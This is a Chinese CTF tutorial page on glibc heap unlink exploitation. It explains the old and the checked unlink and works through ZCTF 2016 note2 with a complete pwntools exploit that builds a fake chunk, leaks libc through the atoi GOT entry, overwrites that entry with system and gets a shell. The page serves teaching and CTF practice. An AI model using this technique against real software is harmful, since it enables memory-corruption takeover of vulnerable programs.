unlink
======

原理
----

我们在利用 unlink 所造成的漏洞时，其实就是对与 unlink 相关的内存进行布局，然后借助 unlink 本身的操作来达成某些目的。

我们先来简单回顾一下 unlink 的目的与过程，其目的主要是想把一个双向链表中的空闲块拿出来，然后和目前free chunk 进行合并。其基本的过程如下

.. figure:: /pwn/heap/figure/unlink_smallbin_intro.png
   :alt: 

下面我们会首先介绍一下 unlink 最初没有防护时的利用，然后介绍目前利用unlink 的方式。

古老的 unlink
~~~~~~~~~~~~~

在最初 unlink 实现的时候，其实是没有对双向链表检查的，也就是说，没有以下的代码。

.. code:: c

    // 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
          malloc_printerr ("corrupted size vs. prev_size");               \
    // fd bk
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \
      malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \
      
      // next_size related
                  if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)              \
                    || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    \
                  malloc_printerr (check_action,                                      \
                                   "corrupted double-linked list (not small)",    \
                                   P, AV);   

这里我们以32位为例，假设堆内存最初的布局是下面的样子

.. figure:: /pwn/heap/figure/old_unlink_vul.png
   :alt: 

那么如果我们通过某种方式（\ **比如溢出**\ ）将 Nextchunk 的 fd 和 bk 指针修改为指定的值。则当我们free(Q)时

1. glibc 判断这个块是 small chunk。
2. 判断前向合并，发现前一个 chunk 处于使用状态，不需要前向合并。
3. 判断后向合并，发现后一个 chunk 处于空闲状态，需要合并。
4. 继而对 nextchunk 采取 unlink 操作。

那么 unlink 具体执行的效果是什么样子呢？我们可以来分析一下

-  FD=P->fd = target addr -12
-  BK=P->bk = expect value
-  FD->bk = BK，即 \*(target addr-12+12)=BK=expect value
-  BK->fd = FD，即\*(expect value +8) = FD = target addr-12

**看起来我们似乎可以通过 unlink 直接实现任意地址读写的目的，但是我们还是需要确保 expect value +8 地址具有可写的权限。**

比如说我们将 target addr 设置为某个 got 表项，那么当程序调用对应的 libc 函数时，就会直接执行我们设置的值（expect value）处的代码。\ **但是需要注意的是，expect value+8
处的值被破坏了，需要想办法绕过。**

当前的 unlink
~~~~~~~~~~~~~

**但是，现实是残酷的。。**\ 我们刚才考虑的是没有检查的情况，但是一旦加上检查，就没有这么简单了。我们看一下对 fd 和 bk的检查

.. code:: c

    // fd bk
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \
      malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \

此时

-  FD->bk = \*(target addr-12+12)=\*target\_addr
-  BK->fd = \*(expect value+8)

那么，我们上面所利用的修改GOT表项的方法就不可用了。

但是，如果我们使得\*(expect value+8)还是\*target\_addr 等于 P，那么我们可以执行

-  \*P= expect value = P - 8
-  \*P = target addr -12 = P - 12

即改写了指针P的内容，将其指向了比自己低12的地址处。

而如果我们想要使得两者都指向P，只需要我们改变原来的修改的策略如下

.. figure:: /pwn/heap/figure/new_unlink_vul.png
   :alt: 

我们会通过之后的例子来说明，我们这样的修改是可以达到一定的效果的。

需要注意的是，这里我们并没有违背下面的约束。

.. code:: c

        // 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。
        if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
          malloc_printerr ("corrupted size vs. prev_size");               \

例子
----

这里我们以2016年 ZCTF 中的 note2 为例进行介绍。

分析程序
~~~~~~~~

首先，我们先分析一下程序，可以看出程序的主要功能为

-  添加note，size限制为0x80，size会被记录，note指针会被记录。
-  展示note内容。
-  编辑note内容，其中包括覆盖已有的note，在已有的note后面添加内容。
-  释放note。

仔细分析后，可以发现程序有以下几个问题

1. 在添加note时，程序会记录note对应的大小，该大小会用于控制读取note的内容，但是读取的循环变量i是无符号变量，所以比较时都会转换为无符号变量，那么当我们输入size为0时，glibc根据其规定，会分配0x20个字节，但是程序读取的内容却并不受到限制，故而会产生堆溢出。
2. 程序在每次编辑note时，都会申请0xa0大小的内存，但是在 free 之后并没有设置为NULL。

第一个问题对应在ida中的代码如下

.. code:: c

    unsigned __int64 __fastcall ReadLenChar(__int64 a1, __int64 a2, char a3)
    {
      char v4; // [sp+Ch] [bp-34h]@1
      char buf; // [sp+2Fh] [bp-11h]@2
      unsigned __int64 i; // [sp+30h] [bp-10h]@1
      __int64 v7; // [sp+38h] [bp-8h]@2

      v4 = a3;
      for ( i = 0LL; a2 - 1 > i; ++i )
      {
        v7 = read(0, &buf, 1uLL);
        if ( v7 <= 0 )
          exit(-1);
        if ( buf == v4 )
          break;
        *(_BYTE *)(i + a1) = buf;
      }
      *(_BYTE *)(a1 + i) = 0;
      return i;
    }

其中i是unsigned类型，a2为int类型，所以两者在for循环相比较的时候，a2-1的结果-1会被视为unsigned类型，此时，即最大的整数。所以说可以读取任意长度的数据，这里也就是后面我们溢出所使用的办法。

基本思路
~~~~~~~~

这里我们主要利用发现的第一个问题，主要利用了fastbin的机制、unlink的机制。

下面依次进行讲解。

基本操作
^^^^^^^^

首先，我们先把note可能的基本操作列举出来。

.. code:: python

    p = process('./note2')
    note2 = ELF('./note2')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    context.log_level = 'debug'


    def newnote(length, content):
        p.recvuntil('option--->>')
        p.sendline('1')
        p.recvuntil('(less than 128)')
        p.sendline(str(length))
        p.recvuntil('content:')
        p.sendline(content)


    def shownote(id):
        p.recvuntil('option--->>')
        p.sendline('2')
        p.recvuntil('note:')
        p.sendline(str(id))


    def editnote(id, choice, s):
        p.recvuntil('option--->>')
        p.sendline('3')
        p.recvuntil('note:')
        p.sendline(str(id))
        p.recvuntil('2.append]')
        p.sendline(str(choice))
        p.sendline(s)


    def deletenote(id):
        p.recvuntil('option--->>')
        p.sendline('4')
        p.recvuntil('note:')
        p.sendline(str(id))

生成三个note
^^^^^^^^^^^^

这一部分对应的代码如下

.. code:: python

    # chunk0: a fake chunk
    ptr = 0x0000000000602120
    fakefd = ptr - 0x18
    fakebk = ptr - 0x10
    content = 'a' * 8 + p64(0x61) + p64(fakefd) + p64(fakebk) + 'b' * 64 + p64(0x60)
    #content = p64(fakefd) + p64(fakebk)
    newnote(128, content)
    # chunk1: a zero size chunk produce overwrite
    newnote(0, 'a' * 8)
    # chunk2: a chunk to be overwrited and freed
    newnote(0x80, 'b' * 16)

其中这三个note的大小分别为0x80，0，0x80，第二个chunk虽然申请的大小为0，但是glibc的要求chunk块至少可以存储4个必要的字段(prev\_size,size,fd,bk)，所以会分配0x20的空间。同时，由于无符号整数的比较问题，可以为该note输入任意长的字符串。

这里需要注意的是，chunk1中一共构造了两个chunk

-  chunk ptr[0]，这个是为了unlink时修改对应的值。
-  chunk ptr[0]'s nextchunk，这个是为了使得unlink时的第一个检查满足。

.. code:: c

        // 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。
        if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
          malloc_printerr ("corrupted size vs. prev_size");               \

当构造完三个note后，堆的基本构造如图1所示。

::

                                       +-----------------+ high addr
                                       |      ...        |
                                       +-----------------+
                                       |      'b'*8      |
                    ptr[2]-----------> +-----------------+
                                       |    size=0x91    |
                                       +-----------------+
                                       |    prevsize     |
                                       +-----------------+------------
                                       |    unused       |
                                       +-----------------+
                                       |    'a'*8        |
                     ptr[1]----------> +-----------------+  chunk 1
                                       |    size=0x20    |
                                       +-----------------+
                                       |    prevsize     |
                                       +-----------------+-------------
                                       |    unused       |
                                       +-----------------+
                                       |  prev_size=0x60 |
    fake ptr[0] chunk's nextchunk----->+-----------------+
                                       |    64*'a'       |
                                       +-----------------+
                                       |    fakebk       |
                                       +-----------------+
                                       |    fakefd       |
                                       +-----------------+
                                       |    0x61         |  chunk 0
                                       +-----------------+
                                       |    'a *8        |
                     ptr[0]----------> +-----------------+
                                       |    size=0x91    |
                                       +-----------------+
                                       |    prev_size    |
                                       +-----------------+  low addr
                                               图1

释放chunk1-覆盖chunk2-释放chunk2
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

对应的代码如下

.. code:: python

    # edit the chunk1 to overwrite the chunk2
    deletenote(1)
    content = 'a' * 16 + p64(0xa0) + p64(0x90)
    newnote(0, content)
    # delete note 2 to trigger the unlink
    # after unlink, ptr[0] = ptr - 0x18
    deletenote(2)

首先释放 chunk1，由于该chunk属于fastbin，所以下次在申请的时候仍然会申请到该chunk，同时由于上面所说的类型问题，我们可以读取任意字符，所以就可以覆盖chunk3，覆盖之后如图2所示。

::

                                       +-----------------+high addr
                                       |      ...        |
                                       +-----------------+
                                       |   '\x00'+'b'*7  |
                    ptr[2]-----------> +-----------------+ chunk 2
                                       |    size=0x90    |
                                       +-----------------+
                                       |    0xa0         |
                                       +-----------------+------------
                                       |    'a'*8        |
                                       +-----------------+
                                       |    'a'*8        |
                     ptr[1]----------> +-----------------+ chunk 1
                                       |    size=0x20    |
                                       +-----------------+
                                       |    prevsize     |
                                       +-----------------+-------------
                                       |    unused       |
                                       +-----------------+
                                       |  prev_size=0x60 |
    fake ptr[0] chunk's nextchunk----->+-----------------+
                                       |    64*'a'       |
                                       +-----------------+
                                       |    fakebk       |
                                       +-----------------+
                                       |    fakefd       |
                                       +-----------------+
                                       |    0x61         |  chunk 0
                                       +-----------------+
                                       |    'a *8        |
                     ptr[0]----------> +-----------------+
                                       |    size=0x91    |
                                       +-----------------+
                                       |    prev_size    |
                                       +-----------------+  low addr
                                               图2

该覆盖主要是为了释放chunk2的时候可以后向合并（合并低地址），对chunk0中虚拟构造的chunk进行unlink。即将要执行的操作为unlink(ptr[0])，同时我们所构造的fakebk和fakefd满足如下约束

.. code:: c

        if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \

unlink成功执行，会导致ptr[0]所存储的地址变为fakebk，即ptr-0x18。

获取system地址
^^^^^^^^^^^^^^

代码如下

.. code:: python

    # overwrite the chunk0(which is ptr[0]) with got atoi
    atoi_got = note2.got['atoi']
    content = 'a' * 0x18 + p64(atoi_got)
    editnote(0, 1, content)
    # get the aoti addr
    shownote(0)

    sh.recvuntil('is ')
    atoi_addr = sh.recvuntil('\n', drop=True)
    print atoi_addr
    atoi_addr = u64(atoi_addr.ljust(8, '\x00'))
    print 'leak atoi addr: ' + hex(atoi_addr)

    # get system addr
    atoi_offest = libc.symbols['atoi']
    libcbase = atoi_addr - atoi_offest
    system_offest = libc.symbols['system']
    system_addr = libcbase + system_offest

    print 'leak system addr: ', hex(system_addr)

我们修改ptr[0]的内容为ptr的地址-0x18，所以当我们再次编辑 note0 时，可以覆盖ptr[0]的内容。这里我们将其覆盖为atoi的地址。 这样的话，如果我们查看note 0的内容，其实查看的就是atoi的地址。

之后我们根据libc中对应的偏移计算出system的地址。

修改atoi got
^^^^^^^^^^^^

.. code:: python

    # overwrite the atoi got with systemaddr
    content = p64(system_addr)
    editnote(0, 1, content)

由于此时 ptr[0] 的地址 got 表的地址，所以我们可以直接修改该note，覆盖为system地址。

get shell
^^^^^^^^^

.. code:: python

    # get shell
    sh.recvuntil('option--->>')
    sh.sendline('/bin/sh')
    sh.interactive()

此时如果我们再调用atoi，其实调用的就是system函数，所以就可以拿到shell了。

题目
----

-  `HITCON CTF 2014-stkof <http://acez.re/ctf-writeup-hitcon-ctf-2014-stkof-or-modern-heap-overflow/>`__
-  `Insomni'hack 2017-Wheel of Robots <https://gist.github.com/niklasb/074428333b817d2ecb63f7926074427a>`__
-  `DEFCON 2017 Qualifiers beatmeonthedl <https://github.com/Owlz/CTF/raw/master/2017/DEFCON/beatmeonthedl/beatmeonthedl>`__

参考
----

-  malloc@angelboy
